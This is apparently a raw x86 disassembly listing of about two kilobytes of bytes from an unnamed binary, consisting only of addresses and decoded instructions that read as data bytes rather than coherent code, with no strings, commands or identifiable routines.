  405681:	adc    eax,0x43835c
  405686:	adc    al,0x10
  405688:	dec    edx
  405689:	or     al,BYTE PTR [eax]
  40568b:	add    BYTE PTR [ecx],dh
  40568d:	or     DWORD PTR [eax],eax
  40568f:	cmp    al,0x6d
  405691:	and    BYTE PTR [edx+edx*1-0x5b7f25e0],0x81
  405699:	mov    ecx,DWORD PTR ds:0x28a270
  40569f:	add    BYTE PTR [ecx+0x14008010],0x60
  4056a6:	add    dl,BYTE PTR [ebx+0x10041cb0]
  4056ac:	adc    ecx,DWORD PTR [eax-0x67fdc000]
  4056b2:	rol    DWORD PTR [edx+eax*4],0x4
  4056b6:	add    al,dh
  4056b8:	add    eax,DWORD PTR [eax]
  4056ba:	bound  ebx,QWORD PTR [esi]
  4056bc:	add    BYTE PTR [eax-0x77],0x32
  4056c0:	or     BYTE PTR [edx+eax*1+0x40],ch
  4056c4:	add    DWORD PTR [eax],eax
  4056c6:	stos   BYTE PTR es:[edi],al
  4056c7:	add    BYTE PTR [ecx+0x44],ah
  4056ca:	inc    esi
  4056cb:	sub    BYTE PTR [eax],al
  4056cd:	ret    0x3860
  4056d0:	or     DWORD PTR [ecx],eax
  4056d2:	xor    BYTE PTR [ecx],cl
  4056d4:	adc    DWORD PTR [eax],ecx
  4056d6:	xor    BYTE PTR [edx],bh
  4056d8:	les    edx,FWORD PTR ds:0x34012d04
  4056de:	add    BYTE PTR [ebx+0x24142098],al
  4056e4:	adc    BYTE PTR [edx],dl
  4056e6:	pop    es
  4056e7:	push   es
  4056e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056e9:	or     al,0x95
  4056eb:	rcl    BYTE PTR [eax],0xaa
  4056ee:	pop    eax
  4056ef:	sub    al,0x0
  4056f1:	add    al,0x2a
  4056f3:	test   BYTE PTR ds:0x208812c4,ch
  4056f9:	add    ch,BYTE PTR [edx+0x2]
  4056fc:	add    al,0x80
  4056fe:	or     dl,BYTE PTR [eax]
  405700:	nop
  405701:	sub    BYTE PTR [eax],cl
  405703:	add    BYTE PTR [esi],al
  405705:	lds    ebx,FWORD PTR [eax]
  405707:	mov    al,ds:0xf1021400
  40570c:	jo     0x405712
  40570e:	or     al,0x70
  405710:	shl    DWORD PTR [eax],0x4
  405713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405714:	inc    ebx
  405715:	mov    BYTE PTR [eax],dh
  405717:	push   cs
  405718:	adc    BYTE PTR [eax],dh
  40571a:	add    eax,DWORD PTR [ebx]
  40571c:	rcl    BYTE PTR [eax-0x78b3dfe8],0x2c
  405723:	push   eax
  405724:	sub    BYTE PTR [ebx],al
  405726:	or     BYTE PTR [esp+eax*2],al
  405729:	sub    eax,0x8a00544
  40572e:	dec    edx
  40572f:	mov    al,ds:0x18300420
  405734:	mov    esp,0x50d8e0
  405739:	adc    BYTE PTR [edx],ah
  40573b:	and    eax,0xdc106955
  405740:	inc    eax
  405741:	inc    esp
  405742:	add    BYTE PTR [ebp+0x41],dl
  405745:	add    al,0x8
  405747:	add    BYTE PTR [eax-0x7fbf6efa],dh
  40574d:	add    al,ch
  40574f:	add    eax,DWORD PTR [ecx+0x9140]
  405755:	inc    eax
  405756:	add    BYTE PTR [esi],ah
  405758:	push   es
  405759:	enter  0xe42,0x40
  40575d:	or     BYTE PTR [eax],cl
  40575f:	add    al,0x12
  405761:	and    DWORD PTR [edx+0x24],eax
  405764:	add    BYTE PTR [eax],0x30
  405767:	test   BYTE PTR ds:0x202cd202,al
  40576d:	and    BYTE PTR [ecx+0x4],0x42
  405771:	add    al,BYTE PTR [ecx]
  405773:	add    BYTE PTR [eax-0x5b9bbd80],ch
  405779:	or     BYTE PTR [eax],al
  40577b:	add    BYTE PTR [ecx+0x10],ah
  40577e:	add    al,0xa0
  405780:	sub    BYTE PTR [eax],dl
  405782:	or     al,0x49
  405784:	add    DWORD PTR [edx+0x8a12078],eax
  40578a:	adc    al,0x21
  40578c:	add    BYTE PTR [eax+0x1],al
  40578f:	or     BYTE PTR [edx+0x60306063],0x0
  405796:	add    al,BYTE PTR [esi+0xc]
  405799:	push   eax
  40579a:	push   es
  40579b:	add    DWORD PTR [eax+eax*1],0x11103400
  4057a2:	add    eax,0x20080221
  4057a7:	pop    ebx
  4057a8:	mov    al,ds:0xc2002800
  4057ad:	mov    al,0xc
  4057af:	xchg   edi,eax
  4057b0:	pusha  
  4057b1:	cwde   
  4057b2:	adc    al,0x88
  4057b4:	push   eax
  4057b5:	add    BYTE PTR [ecx+0x3],ah
  4057b8:	add    BYTE PTR [eax+eiz*1],dl
  4057bb:	add    al,al
  4057bd:	add    BYTE PTR [eax+0x58],0x60
  4057c1:	xchg   ecx,eax
  4057c2:	add    BYTE PTR [eax+0x20],al
  4057c5:	and    al,0x4e
  4057c7:	nop
  4057c8:	add    al,BYTE PTR [ecx+edi*2]
  4057cb:	nop
  4057cc:	add    BYTE PTR [eax+0x23],cl
  4057cf:	add    BYTE PTR [esp+edx*1],dh
  4057d2:	add    BYTE PTR [eax+0xc],ah
  4057d5:	push   eax
  4057d6:	mov    BYTE PTR [esi],al
  4057d8:	inc    edi
  4057d9:	mov    dl,0x20
  4057db:	or     al,BYTE PTR [eax-0x737f7fac]
  4057e1:	or     eax,0x612640a
  4057e6:	add    BYTE PTR [eax+0x4],al
  4057e9:	mov    BYTE PTR [ebx+edx*1-0x6cc75f80],al
  4057f0:	test   BYTE PTR [eax],al
  4057f2:	mov    ah,0x0
  4057f4:	xchg   esp,eax
  4057f5:	adc    BYTE PTR [eax],al
  4057f7:	cmp    DWORD PTR [eax+0x24971020],ebx
  4057fd:	and    BYTE PTR [eax+ebp*2+0x4],cl
  405801:	add    BYTE PTR [edx+0x18],bl
  405804:	or     BYTE PTR [eax+ebp*1],al
  405807:	sbb    DWORD PTR [eax+eiz*1+0x66],eax
  40580b:	inc    eax
  40580c:	add    DWORD PTR [eax],0x600000a0
  405812:	inc    esi
  405813:	adc    edx,eax
  405815:	or     BYTE PTR [eax],0xa8
  405818:	jb     0x40581e
  40581a:	sub    al,0x4
  40581c:	and    eax,0xa864914b
  405821:	mov    BYTE PTR [esi],al
  405823:	sbb    al,0x20
  405826:	add    BYTE PTR [edi+0x40],al
  405829:	xor    DWORD PTR [eax],eax
  40582b:	test   DWORD PTR [eax],esi
  40582d:	call   0x286168a2
  405832:	es or  al,0x0
  405835:	sub    BYTE PTR [ebx],ah
  405837:	adc    al,0x80
  405839:	add    BYTE PTR [ebx-0x77fff2e0],cl
  40583f:	push   ecx
  405840:	shl    BYTE PTR [edx+edx*1-0x3e],0x80
  405845:	repnz test BYTE PTR [eax],al
  405848:	adc    BYTE PTR [eax],al
  40584a:	add    BYTE PTR [eax+eiz*1],al
  40584d:	rol    BYTE PTR [ecx+0x10],0x40
  405851:	mov    DWORD PTR [eax],eax
  405853:	or     eax,0x4466a802
  405858:	inc    edx
  405859:	adc    al,0x0
  40585b:	pop    ds
  40585c:	add    BYTE PTR [ecx],al
  40585e:	inc    esp
  40585f:	or     al,BYTE PTR [edx]
  405861:	sbb    BYTE PTR [ebx],dl
  405863:	adc    BYTE PTR [eax],al
  405865:	mov    DWORD PTR [eax],edx
  405867:	add    BYTE PTR [edx+eax*1],al
  40586a:	and    DWORD PTR ds:0x3c65d58,eax
  405870:	add    DWORD PTR [eax],esp
  405872:	test   BYTE PTR [edx-0x5ffffffd],dl
  405878:	and    dl,BYTE PTR [esp+edx*4-0x38]
  40587c:	mov    esp,0xca500
  405881:	add    BYTE PTR [ebx+eax*1+0x24021010],ah
  405888:	es in  eax,dx
  40588a:	inc    esp
  40588b:	hlt    
  40588c:	add    dh,BYTE PTR [ebp+0x2f220584]
  405892:	mov    BYTE PTR [edx],dl
  405894:	inc    edx
  405895:	mov    dl,BYTE PTR [eax+eiz*1]
  405898:	push   es
  405899:	and    BYTE PTR [ecx],al
  40589b:	or     DWORD PTR [eax+0x0],esp
  40589e:	inc    eax
  40589f:	sub    dh,BYTE PTR [eax]
  4058a1:	shl    BYTE PTR [eax+0x29a10111],0x44
  4058a8:	add    DWORD PTR [edx-0x3c],edx
  4058ab:	sub    al,BYTE PTR [eax]
  4058ad:	ret    
  4058ae:	add    ecx,eax
  4058b0:	add    cl,BYTE PTR [eax+esi*4]
  4058b3:	or     al,0x8
  4058b5:	inc    eax
  4058b6:	bound  esp,QWORD PTR [eax]
  4058b8:	sub    DWORD PTR [eax],eax
  4058ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058bb:	pusha  
  4058bc:	sub    DWORD PTR ds:0x88980045,edx
  4058c2:	mov    BYTE PTR [esi],al
  4058c4:	rol    BYTE PTR [edx],cl
  4058c6:	add    DWORD PTR [eax],esi
  4058c8:	add    al,BYTE PTR [ecx]
  4058ca:	add    ah,BYTE PTR [edx+0x4119508b]
  4058d0:	or     BYTE PTR [edx-0x3f3dbffc],al
  4058d6:	adc    BYTE PTR [eax],al
  4058d8:	add    BYTE PTR [eax+0x8180201],dl
  4058de:	rol    BYTE PTR [edx+0x40],0xd8
  4058e2:	add    ch,BYTE PTR [eax-0x5d97f7d0]
  4058e8:	inc    ecx
  4058e9:	mov    BYTE PTR ds:0x642c584,cl
  4058ef:	add    DWORD PTR [eax],0x30820004
  4058f5:	add    BYTE PTR [edi-0x59],al
  4058f8:	and    BYTE PTR [edx+0x984040],ah
  4058fe:	aaa    
  4058ff:	pusha  
  405900:	inc    edx
  405901:	add    al,BYTE PTR ds:0x205b0058
  405907:	add    DWORD PTR [eax+0x1],ebx
  40590a:	add    BYTE PTR [eax+0x20],al
  40590d:	sbb    eax,0x206906b0
  405912:	pop    eax
  405913:	inc    ebp
  405914:	mov    eax,ds:0x400108a2
  405919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40591a:	sub    BYTE PTR [ebp-0x79],al
  40591d:	pusha  
  40591e:	add    edx,DWORD PTR [eax+eax*1-0x66]
  405922:	add    DWORD PTR [eax+0x9],edx
  405925:	and    ah,ah
  405927:	sub    BYTE PTR [edx],al
  405929:	and    BYTE PTR [eax],dl
  40592b:	loopne 0x405953
  40592d:	inc    ecx
  40592e:	nop
  40592f:	sbb    BYTE PTR [eax+0x0],cl
  405932:	test   al,0xd5
  405934:	jo     0x4058f9
  405936:	xor    BYTE PTR [eax],0x28
  405939:	adc    BYTE PTR [eax+edx*2],al
  40593c:	or     BYTE PTR [eax-0x7e],ah
  40593f:	pusha  
  405940:	add    BYTE PTR [eax],bl
  405942:	add    BYTE PTR [eax],0x84
  405945:	mov    BYTE PTR [esi],dl
  405947:	and    ah,BYTE PTR [ebx]
  405949:	add    al,BYTE PTR [eax]
  40594b:	add    BYTE PTR [ecx+eax*1],ah
  40594e:	add    eax,esp
  405950:	inc    edx
  405951:	adc    al,0x8
  405953:	add    bl,BYTE PTR [eax+ecx*4]
  405956:	add    dl,BYTE PTR [esi]
  405958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405959:	lds    ecx,FWORD PTR [edx]
  40595b:	dec    eax
  40595c:	dec    edx
  40595d:	inc    eax
  40595e:	push   es
  40595f:	xchg   DWORD PTR [eax],esp
  405961:	and    BYTE PTR [edx],al
  405963:	inc    eax
  405964:	xchg   esp,eax
  405965:	add    BYTE PTR [esi+ecx*1+0x554049c0],0x8a
  40596d:	and    eax,0x51600880
  405972:	mov    al,ds:0xac0202e0
  405977:	adc    BYTE PTR [ebp+0x20941418],al
  40597d:	sbb    al,0xe0
  40597f:	adc    DWORD PTR [eax+ebx*1],0x15004080
  405986:	inc    eax
  405987:	and    BYTE PTR [ebx],cl
  405989:	add    BYTE PTR [eax-0x77dff9ff],bl
  40598f:	sub    BYTE PTR [eax],cl
  405991:	add    BYTE PTR [eax+0x40],cl
  405994:	test   al,0xa7
  405996:	das    
  405997:	adc    BYTE PTR [ecx],al
  405999:	xor    ah,BYTE PTR [eax]
  40599b:	dec    edx
  40599c:	add    al,BYTE PTR [edi]
  40599e:	xor    BYTE PTR [eax-0x77],al
  4059a1:	add    BYTE PTR [ecx],dh
  4059a3:	add    DWORD PTR [edx],eax
  4059a5:	and    ch,BYTE PTR [eax]
  4059a7:	je     0x4059d1
  4059a9:	sbb    BYTE PTR [edx],ah
  4059ab:	adc    BYTE PTR [eax+eax*1],al
  4059ae:	and    DWORD PTR [eax+0x31020685],ecx
  4059b4:	add    al,0x84
  4059b6:	les    eax,FWORD PTR [edx]
  4059b8:	mov    al,ds:0xa48810
  4059bd:	inc    esp
  4059be:	add    DWORD PTR [eax+edx*2+0x98866f0],ecx
  4059c5:	push   es
  4059c6:	inc    eax
  4059c7:	pusha  
  4059c8:	adc    al,0x40
  4059ca:	mov    ds:0x10f132,al
  4059cf:	pusha  
  4059d0:	mov    ah,0x0
  4059d2:	and    DWORD PTR [eax+0x28d504b2],eax
  4059d8:	add    BYTE PTR [esi],al
  4059da:	and    DWORD PTR [edi],eax
  4059dc:	inc    esi
  4059dd:	or     DWORD PTR [eax],ecx
  4059df:	push   es
  4059e0:	add    ch,dl
  4059e2:	add    cl,BYTE PTR [edx]
  4059e4:	fcom   QWORD PTR [ecx+0x19021d]
  4059ea:	fadd   DWORD PTR [eax]
  4059ec:	add    BYTE PTR [edi+eax*4+0x38],0x80
  4059f1:	add    BYTE PTR [eax],0x8
  4059f4:	dec    eax
  4059f5:	or     BYTE PTR [eax],al
  4059f7:	inc    edi
  4059f8:	add    BYTE PTR [esi],al
  4059fa:	mov    BYTE PTR [ecx+eax*1+0x11],ah
  4059fe:	or     BYTE PTR [eax],cl
  405a00:	or     BYTE PTR [eax+0x31176006],al
  405a06:	test   BYTE PTR [ecx],ch
  405a08:	xor    BYTE PTR [eax+0x31],al
  405a0b:	add    eax,0x28e20024
  405a10:	inc    esp
  405a11:	mov    al,ds:0x15240616
  405a16:	push   es
  405a17:	add    DWORD PTR [eax],edi
  405a19:	inc    ebx
  405a1a:	inc    eax
  405a1b:	inc    esi
  405a1c:	and    BYTE PTR [eax],al
  405a1e:	shr    DWORD PTR [eax],0x89
  405a21:	adc    BYTE PTR [eax],al
  405a23:	push   esp
  405a24:	pop    DWORD PTR [ebx]
  405a26:	mov    al,0x80
  405a28:	add    BYTE PTR [eax],al
  405a2a:	add    DWORD PTR [ecx],eax
  405a2c:	add    al,ah
  405a2e:	push   esp
  405a2f:	or     BYTE PTR [ecx+0xc40800],dl
  405a35:	push   edx
  405a36:	add    DWORD PTR [ecx],edx
  405a38:	add    BYTE PTR ds:0x2a89af80,dh
  405a3e:	sub    eax,0x2515510a
  405a43:	or     BYTE PTR [eax],ah
  405a45:	add    ah,BYTE PTR [eax-0x7f1dd7d2]
  405a4b:	add    BYTE PTR [eax],al
  405a4d:	pop    esp
  405a4e:	add    BYTE PTR [eax+eax*4-0x6d7ffbf6],dl
  405a55:	in     al,0x81
  405a57:	mov    BYTE PTR [esi],cl
  405a59:	inc    ebx
  405a5a:	adc    DWORD PTR [eax],eax
  405a5c:	inc    ecx
  405a5d:	add    cl,cl
  405a5f:	inc    ebx
  405a60:	ret    
  405a61:	add    ch,BYTE PTR [eax+0x4e]
  405a64:	add    BYTE PTR gs:[eax],cl
  405a67:	inc    ebx
  405a68:	push   eax
  405a69:	adc    BYTE PTR [eax],0xe0
  405a6c:	add    BYTE PTR [edx+0x22402944],al
  405a72:	add    BYTE PTR [eax+0x0],al
  405a75:	pop    eax
  405a76:	and    al,0x14
  405a78:	sbb    bl,BYTE PTR [esi]
  405a7a:	adc    al,0x0
  405a7c:	adc    DWORD PTR [eax],ecx
  405a7e:	add    al,0x20
  405a80:	xchg   esp,eax
  405a81:	loopne 0x405a03
  405a83:	add    DWORD PTR [eax],ecx
  405a85:	and    al,0x58
  405a87:	add    BYTE PTR [eax],al
  405a89:	add    al,0x6
  405a8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a8c:	xchg   esp,eax
  405a8d:	add    bh,BYTE PTR [eax]
  405a8f:	add    dh,BYTE PTR [eax+ebx*4+0x14429060]
  405a96:	inc    eax
  405a97:	daa    
  405a98:	and    DWORD PTR [ecx+0x44],eax
  405a9b:	ror    DWORD PTR [edx+0x207109c5],cl
  405aa1:	jno    0x405ac7
  405aa3:	add    BYTE PTR [ebx],ah
  405aa5:	add    al,0xcd
  405aa7:	add    al,0x52
  405aa9:	add    BYTE PTR [edx+0x10],bl
  405aac:	add    al,0x42
  405aae:	and    al,BYTE PTR [edx]
  405ab0:	add    BYTE PTR [edx+0x2e],ah
  405ab3:	add    BYTE PTR [ebx],al
  405ab5:	or     BYTE PTR [eax],0x4a
  405ab8:	nop
  405ab9:	inc    esp
  405aba:	les    esp,FWORD PTR [esi+0x40]
  405abd:	cmp    al,0x0
  405abf:	add    BYTE PTR [edx],0x80
  405ac2:	and    DWORD PTR [eax+0x4],ecx
  405ac5:	and    ah,BYTE PTR [ecx]
  405ac7:	or     BYTE PTR [eax-0x3f6badef],al
  405acd:	adc    ah,BYTE PTR [esp+ecx*1]
  405ad0:	add    al,BYTE PTR [eax+0x760883c2]
  405ad6:	sbb    BYTE PTR [ecx],al
  405ad8:	popa   
  405ad9:	inc    eax
  405ada:	inc    eax
  405adb:	cwde   
  405adc:	and    al,BYTE PTR [eax]
  405ade:	or     al,0x2
  405ae0:	nop
  405ae1:	inc    ecx
  405ae2:	add    BYTE PTR [eax],al
  405ae4:	adc    DWORD PTR [eax],esp
  405ae6:	xor    DWORD PTR [eax],ebx
  405ae8:	or     BYTE PTR es:[ebx],al
  405aeb:	mov    es,WORD PTR [esi+0x20]
  405aee:	or     BYTE PTR [eax],al
  405af0:	add    BYTE PTR [eax],0x4
  405af3:	loopne 0x405af6
  405af5:	add    DWORD PTR [eax],eax
  405af7:	add    BYTE PTR [eax],0xd4
  405afa:	mov    fs,WORD PTR [edx+eax*2]
  405afd:	adc    al,0xa8
  405aff:	or     BYTE PTR [ecx],ah
  405b01:	and    al,BYTE PTR ds:0x90880800
  405b07:	add    BYTE PTR [edi],al
  405b09:	cdq    
  405b0a:	cwde   
  405b0b:	sbb    al,0x9a
  405b0d:	test   cl,ah
  405b0f:	pop    DWORD PTR [eax]
  405b11:	sub    al,0x1
  405b13:	and    al,0x9
  405b15:	add    DWORD PTR [eax],eax
  405b17:	inc    ebp
  405b18:	xor    BYTE PTR [ecx+ecx*1],cl
  405b1b:	dec    eax
  405b1c:	adc    BYTE PTR [edx+ecx*4+0x288ca02],ah
  405b23:	add    BYTE PTR [ecx],0xc5
  405b26:	mov    WORD PTR [eax],es
  405b28:	inc    eax
  405b29:	adc    al,0x80
  405b2b:	mov    BYTE PTR [eax],dl
  405b2d:	adc    dl,BYTE PTR [eax]
  405b2f:	add    DWORD PTR [eax+0x51],esi
  405b32:	or     al,0xe0
  405b34:	cmp    BYTE PTR [edx+eiz*1],dl
  405b37:	add    al,0x10
  405b39:	xchg   esp,eax
  405b3a:	add    DWORD PTR [eax+eax*4+0x60080048],eax
  405b41:	sbb    BYTE PTR ds:0x51880311,bl
  405b47:	add    edx,DWORD PTR [edx]
  405b49:	xchg   esp,eax
  405b4a:	add    BYTE PTR ds:0x18818421,ah
  405b50:	push   es
  405b51:	or     BYTE PTR [ebp+0x2023660],cl
  405b57:	inc    eax
  405b58:	adc    BYTE PTR [eax+eiz*4+0x3],0x90
  405b5d:	and    BYTE PTR [eax-0x5e],ah
  405b60:	xchg   ecx,eax
  405b61:	cwde   
  405b62:	or     DWORD PTR [edx],eax
  405b64:	adc    eax,0x70024002
  405b69:	add    BYTE PTR [ebx+0x22c022b5],0x1
  405b70:	add    eax,0x12021020
  405b75:	xor    DWORD PTR [ecx+0x48041390],edx
  405b7b:	add    BYTE PTR [eax],al
  405b7d:	inc    ecx
  405b7e:	shl    BYTE PTR [ecx+eax*4],0x40
  405b82:	and    BYTE PTR [eax],al
  405b84:	or     dl,BYTE PTR [eax]
  405b86:	or     eax,0xc2220031
  405b8b:	ror    BYTE PTR [eax],1
  405b8d:	enter  0x16,0x0
  405b91:	int3   
  405b92:	add    dl,BYTE PTR [ecx+0x50073970]
  405b98:	or     DWORD PTR [eax],esp
  405b9a:	sbb    BYTE PTR [eax],ch
  405b9c:	or     BYTE PTR [eax-0x57a6bfa7],ch
  405ba2:	add    al,0x20
  405ba4:	or     BYTE PTR [eax],al
  405ba6:	adc    BYTE PTR [edx-0x5b77beec],ah
  405bac:	and    eax,DWORD PTR [eax+0x4c189018]
  405bb2:	test   BYTE PTR [eax+0x4340008],ch
  405bb8:	pop    ecx
  405bb9:	lods   al,BYTE PTR ds:[esi]
  405bba:	inc    eax
  405bbb:	add    dl,BYTE PTR [edx]
  405bbd:	add    al,BYTE PTR [eax+0x0]
  405bc0:	add    al,BYTE PTR [eax]
  405bc2:	mov    WORD PTR [eax],es
  405bc4:	add    BYTE PTR [edx],ah
  405bc6:	add    DWORD PTR [eax],eax
  405bc8:	add    BYTE PTR [eax+0x44013c01],0xc1
  405bcf:	dec    edx
  405bd0:	add    al,0xbb
  405bd2:	inc    esi
  405bd3:	or     DWORD PTR [ecx-0x63de5df0],ebx
  405bd9:	add    BYTE PTR [eax],0x3
  405bdc:	push   ebx
  405bdd:	add    BYTE PTR [esp+eax*2],0xd1
  405be1:	add    BYTE PTR [ecx+0x20],ah
  405be4:	mov    DWORD PTR [eax+0x1002c4a],edx
  405bea:	add    al,0xe0
  405bec:	add    al,BYTE PTR [ecx-0x80]
  405bef:	and    BYTE PTR [ecx+0x810043],al
  405bf5:	add    BYTE PTR [edi+0x5],al
  405bf8:	sbb    BYTE PTR [eax+0x8],al
  405bfb:	lds    eax,FWORD PTR [eax]
  405bfd:	add    BYTE PTR [esi],dh
  405bff:	inc    esp
  405c00:	shr    DWORD PTR [ecx],0x80
  405c03:	or     BYTE PTR [ebx-0x3db677ff],bl
  405c09:	adc    BYTE PTR [edx+eiz*1+0x21040c92],al
  405c10:	and    al,0x12
  405c13:	rol    DWORD PTR [edx],0x40
  405c16:	add    BYTE PTR [eax],ah
  405c18:	lock stos BYTE PTR es:[edi],al
  405c1a:	or     BYTE PTR [eax],dl
  405c1c:	dec    eax
  405c1d:	and    BYTE PTR [eax-0x7d],dl
  405c20:	mov    BYTE PTR [ecx],ah
  405c22:	add    DWORD PTR [edx],edx
  405c24:	xchg   ecx,eax
  405c25:	pusha  
  405c26:	sbb    al,BYTE PTR ds:0x60974d0e
  405c2c:	inc    edx
  405c2d:	mov    BYTE PTR [eax+ecx*2],dl
  405c30:	xor    al,BYTE PTR [eax]
  405c32:	and    BYTE PTR [edx+edx*1],al
  405c35:	push   eax
  405c36:	nop
  405c37:	pop    edx
  405c38:	sbb    BYTE PTR [eax],0x10
  405c3b:	push   0x3010250
  405c40:	pusha  
  405c41:	add    al,BYTE PTR [ebx]
  405c43:	dec    edx
  405c44:	add    DWORD PTR [eax+eiz*1],edx
  405c47:	enter  0x1a11,0xd8
  405c4b:	add    DWORD PTR [eax+0x5010e049],0x830dc008
  405c55:	addr16 inc esp
  405c57:	or     al,0x21
  405c59:	and    ah,BYTE PTR [esi+0x0]
  405c5c:	add    BYTE PTR [eax+0x481c800c],0x20
  405c63:	sbb    al,0x10
  405c65:	adc    BYTE PTR [edx],0xa0
  405c68:	and    BYTE PTR [edx+edx*1-0x3ff9fef8],dl
  405c6f:	and    al,BYTE PTR [edx]
  405c71:	adc    ah,BYTE PTR [eax]
  405c73:	mov    al,ds:0x85008904
  405c78:	add    al,BYTE PTR [eax+0x21]
  405c7b:	popa   
  405c7c:	adc    BYTE PTR [esp+eax*1-0x6ee3bff0],0x50
  405c84:	add    esp,DWORD PTR [eax]
  405c86:	add    BYTE PTR [ecx],ah
  405c88:	and    BYTE PTR [ebp+0x48500222],0x91
  405c8f:	add    al,0x1
  405c91:	add    DWORD PTR [eax],edx
  405c93:	add    al,0x99
  405c95:	test   al,0x4
  405c97:	sbb    DWORD PTR [ecx+0x220bd250],esp
  405c9d:	and    BYTE PTR [eax+0x44],cl
  405ca0:	xor    BYTE PTR [esi],al
  405ca2:	and    BYTE PTR [eax],dl
  405ca4:	add    BYTE PTR [eax+0x24168022],0x51
  405cab:	or     BYTE PTR [eax+0x44050128],0x0
  405cb2:	or     BYTE PTR [edx+0x0],cl
  405cb5:	or     bl,BYTE PTR [eax+eax*1]
  405cb8:	sbb    DWORD PTR [eax],0x53d4a22
  405cbe:	add    BYTE PTR [eax+eax*1],0x10
  405cc2:	add    BYTE PTR [esi+0x0],al
  405cc5:	add    al,0xc0
  405cc7:	add    al,0x2
  405cc9:	add    eax,DWORD PTR [ecx]
  405ccb:	sub    esp,DWORD PTR [edx+eax*1]
  405cce:	adc    eax,0x20421080
  405cd3:	or     DWORD PTR [ecx],0x13546a
  405cd9:	inc    ecx
  405cda:	add    cl,BYTE PTR [ebx]
  405cdc:	js     0x405d08
  405cde:	add    BYTE PTR [edx+0x40400134],al
  405ce4:	add    al,al
  405ce6:	or     DWORD PTR [eax+0x58],eax
  405ce9:	mov    al,ds:0x616eb82d
  405cee:	add    BYTE PTR [eax+0x2],al
  405cf1:	and    eax,0x10a2bcce
  405cf6:	and    BYTE PTR [eax],al
  405cf8:	add    BYTE PTR [ecx+0x22],0x44
  405cfc:	adc    eax,0x81551008
  405d01:	mov    edx,0x40a36481
  405d06:	xor    eax,ebx
  405d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d09:	and    ah,BYTE PTR [ebx+eiz*1-0x80]
  405d0d:	adc    BYTE PTR [esi+0x9406280],dl
  405d13:	adc    al,0x14
  405d15:	inc    eax
  405d16:	cmp    DWORD PTR [eax],eax
  405d18:	inc    esp
  405d19:	add    DWORD PTR [esi+eax*1],0x81404063
  405d20:	add    BYTE PTR [eax-0x17],al
  405d23:	inc    eax
  405d24:	dec    esp
  405d25:	arpl   WORD PTR [eax],ax
  405d27:	(bad)  
  405d28:	adc    BYTE PTR [esi],al
  405d2a:	and    ecx,DWORD PTR [edi]
  405d2c:	adc    al,0x20
  405d2e:	add    DWORD PTR [ecx],ecx
  405d30:	add    BYTE PTR [eax+0x11123b0],al
  405d36:	sbb    ah,BYTE PTR [esi]
  405d38:	adc    DWORD PTR [eax],eax
  405d3a:	add    BYTE PTR [eax],al
  405d3c:	adc    al,0x2a
  405d3e:	cmc    
  405d3f:	push   cs
  405d40:	add    BYTE PTR [edx],al
  405d42:	add    ecx,ecx
  405d44:	add    BYTE PTR [edx],0x9
  405d47:	test   DWORD PTR [eax],eax
  405d49:	adc    DWORD PTR [eax+0x51],0x38
  405d4d:	add    eax,0x8105902c
  405d52:	mov    sp,0x40
  405d56:	or     eax,0x8c2380e1
  405d5b:	xchg   DWORD PTR [ecx+0x56],edx
  405d5e:	add    BYTE PTR [esp+eax*1],al
  405d61:	add    eax,0x3523a402
  405d66:	adc    bl,al
  405d68:	rcr    BYTE PTR [eax+eax*1],0x18
  405d6c:	(bad)  
  405d6d:	and    eax,0x2c086a10
  405d72:	and    BYTE PTR [ebx+0x40],al
  405d75:	xor    DWORD PTR [edx+0x8],ebp
  405d78:	xchg   DWORD PTR [eax],eax
  405d7a:	xor    BYTE PTR [edx+eax*4+0xc248098],ah
  405d81:	push   0xc2a1450d
  405d86:	add    BYTE PTR [eax-0x7efdf800],cl
  405d8c:	add    DWORD PTR [eax+ecx*1-0x697ebfe8],esp
  405d93:	add    DWORD PTR [eax+0x1],eax
  405d96:	nop
  405d97:	mov    al,ds:0x1004608
  405d9c:	xor    al,BYTE PTR [eax+eax*4]
  405d9f:	xchg   BYTE PTR [ecx],dh
  405da1:	add    DWORD PTR [edx],eax
  405da3:	and    eax,0x14200222
  405da8:	lea    esp,[eax]
  405daa:	adc    BYTE PTR [eax],al
  405dac:	push   edx
  405dad:	xor    BYTE PTR [ecx+ebx*1],bl
  405db0:	inc    esp
  405db1:	add    DWORD PTR [eax],eax
  405db3:	xchg   BYTE PTR [ecx+0x54092024],bl
  405db9:	mov    al,ds:0xc0610184
  405dbe:	add    al,0xc4
  405dc0:	push   eax
  405dc1:	add    dl,BYTE PTR [ecx+0x6]
  405dc4:	ror    BYTE PTR [edi+0x10],0x8
  405dc8:	inc    eax
  405dc9:	push   esp
  405dca:	add    ecx,DWORD PTR [eax]
  405dcc:	and    BYTE PTR [ecx+0x2],0x50
  405dd0:	popa   
  405dd1:	push   edx
  405dd2:	inc    esp
  405dd3:	inc    edx
  405dd4:	add    al,0x0
  405dd6:	xor    DWORD PTR [eax+0x14],esp
  405dd9:	add    BYTE PTR [eax],dh
  405ddb:	add    BYTE PTR [eax],ah
  405ddd:	inc    eax
  405dde:	add    esp,DWORD PTR [esp+ecx*4]
  405de1:	xor    DWORD PTR [ecx+edx*1],ebp
  405de4:	sub    DWORD PTR [esi],eax
  405de6:	add    BYTE PTR [eax+edx*1],0x25
  405dea:	or     BYTE PTR [ecx+0x28880c6],dh
  405df0:	and    eax,0x6000203
  405df5:	add    al,0x20
  405df7:	and    al,0x1
  405df9:	add    BYTE PTR [eax],0x2
  405dfc:	dec    eax
  405dfd:	xor    eax,0x8006a432
  405e02:	sub    edx,DWORD PTR [ecx]
  405e04:	and    eax,0x80e00400
  405e09:	adc    al,BYTE PTR [esi]
  405e0b:	adc    al,BYTE PTR [eax+edx*4]
  405e0e:	sub    BYTE PTR [eax],al
  405e10:	sbb    al,0x0
  405e12:	sbb    BYTE PTR [eax+0x20],bl
  405e15:	mov    BYTE PTR [eax+0x14022080],al
  405e1b:	inc    ebx
  405e1c:	add    eax,0x8885040
  405e21:	mov    WORD PTR [ecx-0x60],es
  405e24:	inc    edx
  405e25:	mov    ah,0xa0
  405e27:	inc    edx
  405e28:	add    al,0x83
  405e2a:	ror    DWORD PTR [esi],0x80
  405e2d:	pop    es
